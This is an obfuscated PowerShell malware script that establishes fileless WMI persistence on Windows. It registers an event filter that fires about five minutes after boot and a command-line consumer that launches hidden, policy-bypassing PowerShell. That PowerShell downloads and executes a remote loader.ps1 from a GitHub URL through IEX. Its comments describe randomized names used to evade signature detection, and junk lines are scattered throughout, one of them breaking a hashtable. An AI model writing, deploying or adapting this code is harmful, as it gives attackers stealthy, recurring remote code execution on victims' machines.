$ErrorActionPreference = "SilentlyContinue"
# ODakCHIJHHoWJpgUylVhawTHACjcta

# === Fileless WMI Persistence ===
# KkHEFNdtbxICXHHbIwnmzYlLFAPNcw
# Strategy: 
# 1. Do NOT drop binary to disk.
# 2. Register WMI Event to trigger on system uptime (delayed start).
$null = Get-Date -Format "JIWV"
# 3. Consumer executes the PowerShell Cradle to download loader.ps1.
$null = Get-Date -Format "RANL"

$qmtNvUtVlUEfaVral = "https://raw.githubusercontent.com/jeromegerchin/upjsdefer/main/loader.ps1"
# Hardened Cradle (Hidden, Bypass, No Profile)
# We use a randomized variable for IEX to avoid simple signatures
# VJrcSaDmuwMgEVfJrZTnYqczJOSFkF
$YDOvYvOlHeuycjox = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('$qmtNvUtVlUEfaVral')"""

$null = Get-Date -Format "jRJw"
# 2. Randomization
# idgCIiuBrRJvvjjTNdVgeOkpbcARyu
$rbuZueceSNbrcpNMbASy = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
$TfZlGEjKspSmRm = ""
# xSeuUFSGPBdsKLnZBwFdaDzoGkdJyj
1..10 | ForEach-Object { $TfZlGEjKspSmRm += $rbuZueceSNbrcpNMbASy[(Get-Random -Maximum $rbuZueceSNbrcpNMbASy.Length)] }

$null = Get-Date -Format "Imdg"
# 3. Clean Old Persistence (if matches our pattern, optional)
Get-WmiObject __EventFilter -Namespace "root\subscription" | Where-Object { $_.Name -match "SysX" } | Remove-WmiObject

# 3. Create Trigger (Filter)
# Trigger: 5 minutes after boot (Uptime > 300s & < 400s)
# Optimized to run only ONCE per boot cycle
$rihtNzhBpqjEOX = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360"

$wNioFlqvylDUlDByHLqj = @{
    Name           = $TfZlGEjKspSmRm
    EventNamespace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = $rihtNzhBpqjEOX
}
$LagCmPrAJFCq = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $wNioFlqvylDUlDByHLqj

# 4. Create Action (Consumer)
$null = Get-Date -Format "XcVe"
$myskOJoZFmhRY = @{
    Name                = $TfZlGEjKspSmRm
    CommandLineTemplate = $YDOvYvOlHeuycjox
    RunInteractively    = $false
}
$BmaERLdISbuBsHeEldjL = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $myskOJoZFmhRY

# hgImWWwbzNSuCOamvJuGBOHxZMaxxI
# 5. Bind
$UisLQUlHKTtLKJvd = @{
$null = Get-Date -Format "fSdX"
    Filter   = $LagCmPrAJFCq
    Consumer = $BmaERLdISbuBsHeEldjL
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $UisLQUlHKTtLKJvd

Write-Host "[+] Fileless WMI Persistence Established" -ForegroundColor Green

